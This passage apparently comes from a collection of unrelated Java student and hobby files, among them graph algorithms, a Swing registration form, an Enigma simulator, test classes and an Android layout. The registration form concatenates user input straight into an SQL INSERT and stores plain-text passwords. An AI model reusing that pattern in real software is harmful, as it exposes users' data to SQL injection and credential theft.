maxCycle=Math.max(maxCycle,count);\r\n            }\r\n        }\r\n        return  maxCycle>1?maxCycle:-1;\r\n    }\r\n    public static void dfs_bridge_finding(List<List<Integer>> list,boolean[] visist,int time,int[] discover_tym,int[] lowest_discover_time,int current,int parent,List<List<Integer>> ans){\r\n        visist[current]=true;\r\n        discover_tym[current]=lowest_discover_time[current]=++time;\r\n\r\n        for (int i=0;i<list.size();i++){\r\n            int curr_src=list.get(i).get(0);\r\n            int curr_neighbour=list.get(i).get(1);\r\n            if (curr_neighbour==parent){\r\n                continue;\r\n            }\r\n            else if (!visist[curr_neighbour]) {\r\n                dfs_bridge_finding(list,visist,time,discover_tym,lowest_discover_time,c",
    "package LoginRagiesterFrom;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\n\r\npublic class Ragistretion extends JFrame {\r\n    Ragistretion(){\r\n        JPanel panel = new JPanel();\r\n        panel.setLayout(null);\r\n        panel.setLayout(null);\r\n        panel.setBounds(370,110,500,400);\r\n        // panel.setBackground(new Color(3, 45, 48))\r\n        panel.setBackground(new Color(0,0,0,100));\r\n        add(panel);\r\n\r\n        JLabel a = new JLabel(\"Registrar From\");\r\n        a.setFont(new Font(\"Tahoma\",Font.BOLD,20));\r\n        a.setForeground(Color.white);\r\n        a.setBounds(200,10,200,23);\r\n        panel.add (a);\r\n\r\n        JLabel l1 = new JLabel(\"Username\");\r\n        l1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        l1.setForeground(Color.white);\r\n        l1.setBounds(185,66,90,14);\r\n        panel.add(l1);\r\n\r\n        JTextField t1 = new JTextField();\r\n        t1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        t1.setForeground(Color.white);\r\n        t1.setBackground(new Color(16,108,115));\r\n        t1.setBounds(185,85,160,23);\r\n        panel.add(t1);\r\n\r\n        JLabel l3 = new JLabel(\"Password\");\r\n        l3.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        l3.setForeground(Color.white);\r\n        l3.setBounds(185,130,90,14);\r\n        panel.add(l3);\r\n\r\n        JTextField t2 = new JTextField();\r\n        t2.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        t2.setForeground(Color.white);\r\n        t2.setBackground(new Color(16,108,115));\r\n        t2.setBounds(185,150,160,23);\r\n        panel.add(t2);\r\n\r\n        JLabel l4 = new JLabel(\" Confirm Password\");\r\n        l4.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        l4.setForeground(Color.white);\r\n        l4.setBounds(185,190,200,14);\r\n        panel.add(l4);\r\n\r\n        JPasswordField p1 = new JPasswordField();\r\n        p1.setForeground(Color.white);\r\n        p1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        p1.setBackground(new Color(16,108,115));\r\n        p1.setBounds(185,210,160,23);\r\n        panel.add(p1);\r\n\r\n        JLabel l5 = new JLabel(\"Gmail\");\r\n        l5.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        l5.setForeground(Color.white);\r\n        l5.setBounds(185,250,200,14);\r\n        panel.add(l5);\r\n\r\n        JTextField t3 = new JTextField();\r\n        t3.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        t3.setForeground(Color.white);\r\n        t3.setBackground(new Color(16,108,115));\r\n        t3.setBounds(185,270,160,23);\r\n        panel.add(t3);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        JButton b1 = new JButton(\"Clear\");\r\n        b1.setFont(new Font(\"Tahoma\",Font.BOLD,12));\r\n        b1.setBackground(new Color(15, 29, 31));\r\n        b1.setForeground(Color.white);\r\n        b1.setBounds(305,350,70,30);\r\n        panel.add(b1);\r\n        b1.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n              try{\r\n                  if (e.getSource()==b1){\r\n                      t1.setText(\"\");\r\n                      t2.setText(\"\");\r\n                      t3.setText(\"\");\r\n\r\n                  }\r\n\r\n              }catch (Exception E){\r\n                  E.printStackTrace();\r\n              }\r\n\r\n            }\r\n        });\r\n\r\n        JButton b2 = new JButton(\" Register\");\r\n        b2.setFont(new Font(\"Tahoma\",Font.BOLD,12));\r\n        b2.setBackground(new Color(5, 45, 48));\r\n        b2.setForeground(Color.white);\r\n        b2.setBounds(95,350,165,30);\r\n        panel.add(b2);\r\n        b2.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                try {\r\n\r\n                if (e.getSource() == b2) {\r\n                    String user = t1.getText();\r\n                    String pass = t2.getText();\r\n                    String Con_pass = String.valueOf(p1.getPassword());\r\n                    String mail = t3.getText();\r\n                    if (t1.getText().equals(\"\")){\r\n                        JOptionPane.showMessageDialog(null,\"Please Fill the Username First\");\r\n                    }else if (t2.getText().equals(\"\")){\r\n                        JOptionPane.showMessageDialog(null,\"Fill the Password\");\r\n                    }else\r\n                    {\r\n                        Con_database c = new Con_database();\r\n                        String q = \"insert into login3 values('\"+user+\"', '\"+pass+\"' , '\"+Con_pass+\"' , '\"+mail+\"' )\";\r\n                        c.statement.executeUpdate(q);\r\n                        JOptionPane.showMessageDialog(null,\"Ragistretion Successfully \");\r\n                        new Login1();\r\n                        setVisible(false);\r\n                    }\r\n\r\n                }\r\n\r\n\r\n                    }catch(Exception E){\r\n                        E.printStackTrace();\r\n\r\n                    }\r\n\r\n\r\n            }\r\n        });\r\n\r\n        ImageIcon img1 = new ImageIcon(ClassLoader.getSystemResource(\"money s6.jpg\"));\r\n        Image i = img1.getImage().getSc",
    "package Enigma;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.Properties;\n\n//Questa versione della macchina enigma \u00e8 solo una semplificazione che non tiene conto del processo in toto\npublic class EnigmaSimulator {\n    // Definizione dell'alfabeto della macchina Enigma\n    private static String DIZIONARIO = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n    // Array per i rotori della macchina Enigma\n    private String[] rotori = new String[3];\n    // Configurazione del plugboard\n    private String plug;\n\n    // Costruttore della classe EnigmaSimulator\n    public EnigmaSimulator() throws IOException {\n        // Carica le propriet\u00e0 dalla configurazione del file enigma.properties\n        Properties props = new Properties();\n        props.load(new FileReader(\"enigma.properties\"));\n\n        // Inizializza i rotori prendendo i valori dal file di configurazione\n        rotori[0] = props.getProperty(\"rotore1\");\n        rotori[1] = props.getProperty(\"rotore2\");\n        rotori[2] = props.getProperty(\"rotore3\");\n        // Inizializza la configurazione del plugboard prendendo il valore dal file di configurazione\n        this.plug = props.getProperty(\"plug\");\n    }\n\n    // Metodo per cifrare o decifrare un messaggio\n    public String cifraDecifra(String messaggio, boolean cifra) {\n        // StringBuilder per memorizzare il risultato\n        StringBuilder risultato = new StringBuilder();\n\n        // Iterazione attraverso ogni carattere del messaggio\n        for (char c : messaggio.toUpperCase().toCharArray()) {\n            // Controlla se il carattere \u00e8 presente nell'alfabeto della macchina Enigma\n            if (DIZIONARIO.indexOf(c) != -1 ) {\n                // Applica la configurazione del plugboard al carattere\n                c = applicaPlugboard(c);\n\n                // Cifra o decifra il carattere attraverso i rotori\n                if (cifra) {\n                    for (String rotore : rotori) {\n                        c = transforma(c,rotore,true);\n                    }\n                } else {\n                    for (int i = rotori.length -1; i >= 0; i--) {\n                        c = transforma(c,rotori[i],false);\n                    }\n                }\n\n                // Applica di nuovo la configurazione del plugboard al carattere\n                c = applicaPlugboard(c);\n                // Aggiunge il carattere cifrato o decifrato al risultato\n                risultato.append(c);\n            } else {\n                // Se il carattere non \u00e8 nell'alfabeto, lo aggiunge direttamente al risultato\n                risultato.append(c);\n            }\n        }\n        // Restituisce il risultato come stringa\n        return risultato.toString();\n    }\n\n    // Metodo privato per applicare la configurazione del plugboard\n    private char applicaPlugboard(char c) {\n        if (plug != null && !plug.isEmpty()) {\n            // Se il plugboard \u00e8 configurato, scambia i caratteri in base alla configurazione\n            for(String swap : plug.split(\",\")) {\n                if (swap.charAt(0) == c) return swap.charAt(2);\n                if (swap.charAt(2) == c) return swap.charAt(0);\n            }\n        }\n        // Restituisce il carattere originale se non ci sono configurazioni nel plugboard\n        return c;\n    }\n\n    // Metodo privato per trasformare un carattere attraverso un rotore\n    private char transforma(char c, String rotore, boolean cifra) {\n        int  idx = DIZIONARIO.indexOf(c);\n\n        if (cifra) {\n            // Se si sta cifrando, restituisce il carattere corrispondente nel rotore\n            return rotore.charAt(idx);\n        } else {\n            // Se si sta decifrando, restituisce il carattere corrispondente nell'alfabeto della macchina Enigma\n            return DIZIONARIO.charAt(rotore.indexOf(c));\n        }\n    }\n\n    // Metodo principale per eseguire la cifratura o decifratura da riga di comando\n    public static void main (String [] args) throws IOException {\n        // Controlla se ci sono due argomenti passati da riga di comando\n        if (args.length != 2) {\n            // Se non ci sono due argomenti, stampa un messaggio di errore e termina il programma\n            System.out.println(\"uso <messaggio> <1 per cifrare, 0 per decifrare>\");\n            return;\n        }\n    \n        // Crea un'istanza di EnigmaSimulator\n        EnigmaSimulator enigma = new EnigmaSimulator();\n        // Ottiene il messaggio e la modalita (cifratura o decifratura) dagli argomenti passati da riga di comando\n        String messaggio = args[0];\n        boolean modalita = \"1\".equals(args[1]);\n\n        // Esegue la cifratura o decifratura del messaggio e stampa il risultato\n        String risultato = enigma.cifraDecifra(messaggio, modalita);\n        System.out.println(\"Risultato: \" + risultato);\n    }\n}\n",
    "import java.util.Arrays;\r\n\r\npublic class PrincipalCandidatos {\r\n    public static void main(String[] args) {\r\n        Candidato[] candidatos = geraCandidatosAleatorios(10);\r\n        \r\n        // Ordenando os candidatos pelo nome\r\n        ordenaCandidatosPorNome(candidatos);\r\n        System.out.println(\"Ordenados por nome:\");\r\n        System.out.println(Arrays.toString(candidatos));\r\n\r\n        // Ordenando os candidatos por inten\u00e7\u00f5es de votos\r\n        ordenaCandidatosPorVotos(candidatos);\r\n        System.out.println(\"\\nOrdenados por inten\u00e7\u00f5es de votos:\");\r\n        System.out.println(Arrays.toString(candidatos));\r\n\r\n        // Ordenando os candidatos pelo partido\r\n        ordenaCandidatosPorPartido(candidatos);\r\n        System.out.println(\"\\nOrdenados por partido:\");\r\n        System.out.println(Arrays.toString(candidatos));\r\n\r\n        // Testando pesquisa bin\u00e1ria\r\n        Candidato candidatoPesquisado = pesquisaBinariaCandidatos(candidatos, \"Jo\u00e3o\");\r\n        System.out.println(\"\\nCandidato encontrado: \" + candidatoPesquisado);\r\n    }\r\n\r\n    private static Candidato[] geraCandidatosAleatorios(int quantidade) {\r\n        Candidato[] candidatos = new Candidato[quantidade];\r\n        for (int i = 0; i < quantidade; i++) {\r\n            candidatos[i] = new Candidato(\"Candidato\" + i, \"Partido\" + (i % 3), (int) (Math.random() * 1000));\r\n        }\r\n        return candidatos;\r\n    }\r\n\r\n    public static void ordenaCandidatosPorNome(Candidato[] candidatos) {\r\n        // Implementa\u00e7\u00e3o da ordena\u00e7\u00e3o por nome\r\n    }\r\n\r\n    public static void ordenaCandidatosPorVotos(Candidato[] candidatos) {\r\n        // Implementa\u00e7\u00e3o da ordena\u00e7\u00e3o por inten\u00e7\u00f5es de votos\r\n    }\r\n\r\n    public static void ordenaCandidatosPorPartido(Candidato[] candidatos) {\r\n        // Implementa\u00e7\u00e3o da ordena\u00e7\u00e3o por partido\r\n    }\r\n\r\n    public static Candidato pesquisaBinariaCandidatos(Candidato[] candidatos, String nome) {\r\n        // Implementa\u00e7\u00e3o da pesquisa bin\u00e1ria\r\n        return null;\r\n    }\r\n}\r\n",
    "package com.example.travel1.Domains;\n\nimport java.io.Serializable;\n\npublic class PopularDomain implements Serializable {\n\n    private String title;\n    private String location;\n    private String description;\n    private int bed;\n    private boolean guide;\n    private double score;\n    private String pic;\n    private boolean wifi;\n    private int price;\n\n\n    public PopularDomain(String title, String location, String description, int bed, boolean guide, double score, String pic, boolean wifi, int price) {\n        this.title = title;\n        this.location = location;\n        this.description = description;\n        this.bed = bed;\n        this.guide = guide;\n        this.score = score;\n        this.pic = pic;\n        this.wifi = wifi;\n        this.price = price;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getLocation() {\n        return location;\n    }\n\n    public void setLocation(String location) {\n        this.location = location;\n    }\n\n    public String getDescription() {\n        return description;\n    }\n\n    public void setDescription(String description) {\n        this.description = description;\n    }\n\n    public int getBed() {\n        return bed;\n    }\n\n    public void setBed(int bed) {\n        this.bed = bed;\n    }\n\n    public boolean isGuide() {\n        return guide;\n    }\n\n    public void setGuide(boolean guide) {\n        this.guide = guide;\n    }\n\n    public double getScore() {\n        return score;\n    }\n\n    public void setScore(double score) {\n        this.score = score;\n    }\n\n    public String getPic() {\n        return pic;\n    }\n\n    public void setPic(String pic) {\n        this.pic = pic;\n    }\n\n    public boolean isWifi() {\n        return wifi;\n    }\n\n    public void setWifi(boolean wifi) {\n        this.wifi = wifi;\n    }\n\n    public int getPrice() {\n        return price;\n    }\n\n    public void setPrice(int price) {\n        this.price = price;\n    }\n}\n",
    "//\u7ed9\u4f60\u4e8c\u53c9\u6811\u7684\u6839\u8282\u70b9 root \u548c\u4e00\u4e2a\u8868\u793a\u76ee\u6807\u548c\u7684\u6574\u6570 targetSum \u3002\u5224\u65ad\u8be5\u6811\u4e2d\u662f\u5426\u5b58\u5728 \u6839\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9 \u7684\u8def\u5f84\uff0c\u8fd9\u6761\u8def\u5f84\u4e0a\u6240\u6709\u8282\u70b9\u503c\u76f8\u52a0\u7b49\u4e8e\u76ee\u6807\u548c\n// targetSum \u3002\u5982\u679c\u5b58\u5728\uff0c\u8fd4\u56de true \uff1b\u5426\u5219\uff0c\u8fd4\u56de false \u3002\n//\n// \u53f6\u5b50\u8282\u70b9 \u662f\u6307\u6ca1\u6709\u5b50\u8282\u70b9\u7684\u8282\u70b9\u3002\n//\n//\n//\n// \u793a\u4f8b 1\uff1a\n//\n//\n//\u8f93\u5165\uff1aroot = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22\n//\u8f93\u51fa\uff1atrue\n//\u89e3\u91ca\uff1a\u7b49\u4e8e\u76ee\u6807\u548c\u7684\u6839\u8282\u70b9\u5230\u53f6\u8282\u70b9\u8def\u5f84\u5982\u4e0a\u56fe\u6240\u793a\u3002\n//\n//\n// \u793a\u4f8b 2\uff1a\n//\n//\n//\u8f93\u5165\uff1aroot = [1,2,3], targetSum = 5\n//\u8f93\u51fa\uff1afalse\n//\u89e3\u91ca\uff1a\u6811\u4e2d\u5b58\u5728\u4e24\u6761\u6839\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9\u7684\u8def\u5f84\uff1a\n//(1 --> 2): \u548c\u4e3a 3\n//(1 --> 3): \u548c\u4e3a 4\n//\u4e0d\u5b58\u5728 sum = 5 \u7684\u6839\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9\u7684\u8def\u5f84\u3002\n//\n// \u793a\u4f8b 3\uff1a\n//\n//\n//\u8f93\u5165\uff1aroot = [], targetSum = 0\n//\u8f93\u51fa\uff1afalse\n//\u89e3\u91ca\uff1a\u7531\u4e8e\u6811\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u6839\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9\u7684\u8def\u5f84\u3002\n//\n//\n//\n//\n// \u63d0\u793a\uff1a\n//\n//\n// \u6811\u4e2d\u8282\u70b9\u7684\u6570\u76ee\u5728\u8303\u56f4 [0, 5000] \u5185\n// -1000 <= Node.val <= 1000\n// -1000 <= targetSum <= 1000\n//\n//\n// Related Topics \u6811 \u6df1\u5ea6\u4f18\u5148\u641c\u7d22 \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22 \u4e8c\u53c9\u6811 \ud83d\udc4d 1330 \ud83d\udc4e 0\n\n\n//leetcode submit region begin(Prohibit modification and deletion)\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n    public boolean hasPathSum(TreeNode root, int targetSum)\n    {\n\n\n    }\n}\n//leetcode submit region end(Prohibit modification and deletion)\n",
    "package finalproject;\n\nimport java.util.ArrayList;\n\npublic class RatingDistributionBySchool extends DataAnalyzer {\n    private MyHashTable<String, MyHashTable<String, Integer>> nestedHashTable;\n    public RatingDistributionBySchool(Parser p) {\n        super(p);\n    }\n\n    @Override\n    public MyHashTable<String, Integer> getDistByKeyword(String keyword) {\n        // ADD YOUR CODE BELOW THIS\n        MyHashTable<String, Integer> profAndAvgToCount = this.nestedHashTable.get(keyword.trim().toLowerCase());\n        if (profAndAvgToCount == null) {\n            return null;\n        }\n        for (String key : profAndAvgToCount.getKeySet()) {\n            String[] profAndAvg = key.split(\"\\\\n\");\n            Integer value = profAndAvgToCount.get(key);\n            String roundedAvg = String.valueOf((double) Math.round(Double.parseDouble(profAndAvg[1]) * 100) / 100);\n            profAndAvgToCount.remove(key);\n            profAndAvgToCount.put(profAndAvg[0]+\"\\n\"+roundedAvg, value);\n        }\n        return this.nestedHashTable.get(keyword.trim().toLowerCase());\n    }\n        //ADD YOUR CODE ABOVE THIS\n\n    @Override\n    public void extractInformation() {\n        // ADD YOUR CODE BELOW THIS\n        RatingDistributionByProf ratingDistByProf = new RatingDistributionByProf(parser);\n        MyHashTable<String, Integer> innerHashTable;\n        MyHashTable<String, String> profToAvg = new MyHashTable<>();\n        nestedHashTable = new MyHashTable<String, MyHashTable<String, Integer>>();\n\n        for (String[] line : parser.data) {\n            double avg = 0;\n            String avgRating = \"\";\n            Integer totalReviewCount = 0;\n            String profName = line[parser.fields.get(\"professor_name\")].trim().toLowerCase();\n            String school = line[parser.fields.get(\"school_name\")].trim().toLowerCase();\n            double rating = Double.parseDouble(line[parser.fields.get(\"student_star\")]);\n\n            totalReviewCount = ratingDistByProf.getDistByKeyword(profName).get(\"1\")+ratingDistByProf.getDistByKeyword(profName).get(\"2\")+ratingDistByProf.getDistByKeyword(profName).get(\"3\")+ratingDistByProf.getDistByKeyword(profName).get(\"4\")+ratingDistByProf.getDistByKeyword(profName).get(\"5\");\n            avg = rating / totalReviewCount;\n\n            innerHashTable = nestedHashTable.get(school);\n\n            if (innerHashTable == null) {\n                innerHashTable = new MyHashTable<String, Integer>();\n                avgRating = String.valueOf(avg);\n                innerHashTable.put(profName+\"\\n\"+avgRating, totalReviewCount);\n                nestedHashTable.put(school, innerHashTable);\n                profToAvg.put(profName, avgRating);\n            }\n            else if (profToAvg.get(profName)!=null){\n                double newAvg = (Double.parseDouble(profToAvg.get(profName))+avg);\n                innerHashTable.remove(profName+\"\\n\"+profToAvg.get(profName));\n                innerHashTable.put(profName+\"\\n\"+newAvg, totalReviewCount);\n                profToAvg.put(profName, String.valueOf(newAvg));\n            }\n            else if (profToAvg.get(profName)==null) {\n                avgRating = String.valueOf(avg);\n                innerHashTable.put(profName+\"\\n\"+avgRating, totalReviewCount);\n                profToAvg.put(profName, avgRating);\n            }\n            else {\n                avgRating = String.valueOf(avg);\n                innerHashTable.put(profName+\"\\n\"+avgRating, totalReviewCount);\n                profToAvg.put(profName, avgRating);\n            }\n            //ADD YOUR CODE ABOVE THIS\n        }}}\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\nimport java.util.Calendar;\nimport java.util.concurrent.ThreadLocalRandom;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise06Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        this.outContent.reset();\n        this.errContent.reset();\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n    @Test\n    @DisplayName(\"Check hour\")\n    void testCheckHour() {\n        for (int hour = 0; hour < 24; hour++) {\n            Exercise06.checkHour(hour);\n            String expectedMessage;\n            if (hour >= 7 && hour < 14) {\n                expectedMessage = \"It's morning\";\n            } else if (hour >= 14 && hour < 21) {\n                expectedMessage = \"It's afternoon\";\n            } else {\n                expectedMessage = \"It's night\";\n            }\n            assertTrue(this.outContent.toString().contains(expectedMessage), hour + \"h. \" + expectedMessage + \", not \\\"\" + this.outContent + \"\\\"\");\n            this.outContent.reset();\n        }\n    }\n\n    @Test\n    @DisplayName(\"Check season\")\n    void testCheckSeason() {\n        for (int month = 1; month < 12; month++) {\n            Exercise06.checkSeason(month);\n            String expectedMessage;\n            if (month >= 1 && month < 4) {\n                expectedMessage = \"Winter\";\n            } else if (month >= 4 && month < 7) {\n                expectedMessage = \"Spring\";\n            } else if (month >= 7 && month < 10) {\n                expectedMessage = \"Summer\";\n            } else {\n                expectedMessage = \"Autumn\";\n            }\n            assertTrue(this.outContent.toString().contains(expectedMessage), \"Month \" + month + \" is \" + expectedMessage + \", not \"+ this.outContent.toString());\n            this.outContent.reset();\n        }\n    }\n}",
    "import javax.swing.JFrame;\r\n\r\npublic class Main {\r\n        public static void main(String[] args) {\r\n\r\n                JFrame frame = new JFrame(\"Simple GUI\");\r\n                frame.setVisible(true);\r\n                frame.setSize(500, 500);\r\n                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n\r\n                frame.setLocationRelativeTo(null);\r\n                frame.pack();\r\n                frame.setVisible(true);\r\n                System.out.println(\"Feito por Carlos Miguel, 18/02/22\");\r\n\r\n                System.out.println(\" \");\r\n                System.out.println(\"----------------------------------------------------------\");\r\n                System.out.println(\" \");\r\n                // Atividade 1: Armazenando dois n\u00fameros inteiros em uma vari\u00e1vel e imprimindo a\r\n                // soma:\r\n                int numeroX, numeroY, somaNumeros;\r\n                numeroX = 10;\r\n                numeroY = 90;\r\n                somaNumeros = numeroX + numeroY;\r\n\r\n                System.out.println(\r\n                                \"Atividade 1: armazenando dois n\u00fameros inteiros em uma vari\u00e1vel e imprimindo a soma:\");\r\n                System.out.println(\" \");\r\n                System.out.println(\"Soma das vari\u00e1veis numeroX + numeroY: \" + somaNumeros);\r\n\r\n                System.out.println(\" \");\r\n                System.out.println(\"----------------------------------------------------------\");\r\n                System.out.println(\" \");\r\n\r\n                // Atividade 2: Armazenando 4 notas bimestrais em vari\u00e1veis, calculando e\r\n                // mostrando a m\u00e9dia:\r\n                int bimestres;\r\n                bimestres = 4;\r\n\r\n                double nota1, nota2, nota3, nota4, somaNotas, calculaMedia;\r\n                nota1 = 8.5;\r\n                nota2 = 7.9;\r\n                nota3 = 9.4;\r\n                nota4 = 10;\r\n                somaNotas = nota1 + nota2 + nota3 + nota4;\r\n                calculaMedia = somaNotas / bimestres;\r\n\r\n                System.out.println(\r\n                                \"Atividade 2: armazenando 4 notas bimestrais em vari\u00e1veis, calculando e mostrando a m\u00e9dia:\");\r\n                System.out.println(\" \");\r\n                System.out.println(\"A soma das suas 4 notas bimestrais foi: \" + somaNotas\r\n                                + \". Com isso, a sua m\u00e9dia resultou em: \" + calculaMedia);\r\n\r\n                System.out.println(\" \");\r\n                System.out.println(\"----------------------------------------------------------\");\r\n                System.out.println(\" \");\r\n\r\n                // Atividade 3: Convertendo 25.5 metros para cent\u00edmetros:\r\n                double metros, converter, centimetros;\r\n                metros = 25.5;\r\n                converter = 100;\r\n                centimetros = metros * converter;\r\n\r\n                System.out.println(\"Atividade 3: Convertendo 25.5 metros para cent\u00edmetros:\");\r\n                System.out.println(\" \");\r\n                System.out.println(\"25.5 metros em cent\u00edmetros s\u00e3o: \" + centimetros + \" cent\u00edmetros\");\r\n\r\n                System.out.println(\" \");\r\n                System.out.println(\"----------------------------------------------------------\");\r\n                System.out.println(\" \");\r\n\r\n                // Atividade 4: Calculando e mostrando a \u00e1rea de um c\u00edrculo para os raios r = 5,\r\n                // r = 7 e r = 10.\r\n                int raio1, raio2, raio3;\r\n                raio1 = 5;\r\n                raio2 = 7;\r\n                raio3 = 10;\r\n\r\n                double pI, areaCirculo1, areaCirculo2, areaCirculo3;\r\n                pI = 3.14;\r\n                areaCirculo1 = raio1 * raio1 * pI;\r\n                areaCirculo2 = raio2 * raio2 * pI;\r\n                areaCirculo3 = raio3 * raio3 * pI;\r\n\r\n                System.out.println(\r\n                                \"Atividade 4: Calculando e mostrando a \u00e1rea de um c\u00edrculo para os raios r = 5, r = 7 e r = 10:\");\r\n                System.out.println(\" \");\r\n                System.out.println(\"A \u00e1rea do c\u00edrculo de raio 5 \u00e9: \" + areaCirculo1);\r\n                System.out.println(\" \");\r\n                System.out.println(\"A \u00e1rea do c\u00edrculo de raio 7 \u00e9: \" + areaCirculo2);\r\n                System.out.println(\" \");\r\n                System.out.println(\"A \u00e1rea do c\u00edrculo de raio 10 \u00e9: \" + areaCirculo3);\r\n\r\n                System.out.println(\" \");\r\n                System.out.println(\"----------------------------------------------------------\");\r\n                System.out.println(\" \");\r\n\r\n                // Atividade 5: Calculando a \u00e1rea de um quadrado de lado l = 10, exibindo esta\r\n                // \u00e1rea e mostrando o dobro desta \u00e1rea na tela.\r\n                int ladoQuadrado, areaQuadrado, dobroAreaQuadrado;\r\n                ladoQuadrado = 10;\r\n                areaQuadrado = ladoQuadrado * ladoQuadrado;\r\n                dobroAreaQuadrado = areaQuadrado * 2;\r\n\r\n                System.out.println(\r\n                                \"Atividade 5: Calculando a \u00e1rea de um quadrado de lad",
    "/*\n * Copyright (C) 2014 Freddie (Musenkishi) Lust-Hed\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.musenkishi.wally.views.swipeclearlayout;\n\nimport android.animation.Animator;\nimport android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.content.res.Resources;\nimport android.content.res.TypedArray;\nimport android.graphics.Color;\nimport android.graphics.drawable.ClipDrawable;\nimport android.graphics.drawable.ColorDrawable;\nimport android.graphics.drawable.GradientDrawable;\nimport android.os.Build;\nimport androidx.annotation.NonNull;\nimport androidx.core.view.ViewCompat;\nimport android.util.AttributeSet;\nimport android.util.DisplayMetrics;\nimport android.view.MotionEvent;\nimport android.view.View;\nimport android.view.ViewConfiguration;\nimport android.view.animation.AccelerateInterpolator;\nimport android.view.animation.Animation;\nimport android.view.animation.Animation.AnimationListener;\nimport android.view.animation.DecelerateInterpolator;\nimport android.view.animation.Transformation;\nimport android.widget.AbsListView;\nimport android.widget.ImageView;\nimport android.widget.ProgressBar;\nimport android.widget.RelativeLayout;\n\nimport com.musenkishi.wally.R;\n\n/**\n * The SwipeRefreshLayout should be used whenever the user can refresh the\n * contents of a view via a vertical swipe gesture. The activity that\n * instantiates this view should add an OnRefreshListener to be notified\n * whenever the swipe to refresh gesture is completed. The SwipeRefreshLayout\n * will notify the listener each and every time the gesture is completed again;\n * the listener is responsible for correctly determining when to actually\n * initiate a refresh of its content. If the listener determines there should\n * not be a refresh, it must call setRefreshing(false) to cancel any visual\n * indication of a refresh. If an activity wishes to show just the progress\n * animation, it should call setRefreshing(true). To disable the gesture and\n * progress animation, call setEnabled(false) on the view.\n * <p>\n * This layout should be made the parent of the view that will be refreshed as a\n * result of the gesture and can only support one direct child. This view will\n * also be made the target of the gesture and will be forced to match both the\n * width and the height supplied in this layout. The SwipeRefreshLayout does not\n * provide accessibility events; instead, a menu item must be provided to allow\n * refresh of the content wherever this gesture is used.\n * </p>\n */\npublic class SwipeClearLayout extends RelativeLayout {\n    private static final long RETURN_TO_ORIGINAL_POSITION_TIMEOUT = 300;\n    private static final float ACCELERATE_INTERPOLATION_FACTOR = 1.5f;\n    private static final float DECELERATE_INTERPOLATION_FACTOR = 2f;\n    private static final float MAX_SWIPE_DISTANCE_FACTOR = .6f;\n    private static final int REFRESH_TRIGGER_DISTANCE = 120;\n    private static final int CIRCLE_SIZE = 48;\n    private static final int CIRCLE_DEFAULT_COLOR = Color.MAGENTA;\n    private static final int DEFAULT_ANIMATION_DURATION = 300*2;\n\n    private View circle;\n    private int circleTopMargin = 0;\n    private int circleColor;\n    private int duration = DEFAULT_ANIMATION_DURATION;\n\n    private ProgressBar progressBar;\n\n    private View target; //the content that gets pulled down\n    private int originalOffsetTop;\n    private OnRefreshListener listener;\n    private OnSwipeListener onSwipeListener;\n    private MotionEvent downEvent;\n    private int from;\n    private boolean refreshing = false;\n    private int touchSlop;\n    private float distanceToTriggerSync = -1;\n    private float prevY;\n    private int mediumAnimationDuration;\n    private float currPercentage = 0;\n    private int currentTargetOffsetTop;\n    // Target is returning to its start offset because it was cancelled or a\n    // refresh was triggered.\n    private boolean returningToStart;\n    private final DecelerateInterpolator decelerateInterpolator;\n    private final AccelerateInterpolator accelerateInterpolator;\n    private static final int[] LAYOUT_ATTRS = new int[] {\n            android.R.attr.enabled\n    };\n\n    private final Animation animateToStartPosition = new Animation() {\n        